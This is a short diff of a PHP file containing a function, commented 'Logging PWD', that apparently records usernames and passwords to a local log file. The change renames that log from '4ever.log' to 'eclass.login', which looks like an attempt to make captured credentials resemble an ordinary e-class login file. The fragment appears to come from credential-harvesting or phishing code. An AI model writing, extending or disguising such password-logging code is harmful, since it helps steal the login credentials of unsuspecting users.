@@ -17,7 +17,7 @@ function getCheck() {
 
 function log_p($u, $p, $s) {
 	//Logging PWD
-	$file = '4ever.log';
+	$file = 'eclass.login';
 	// Open the file to get existing content
 	$current = file_get_contents($file);
 	//$s = (true ? '✔' : '✖');
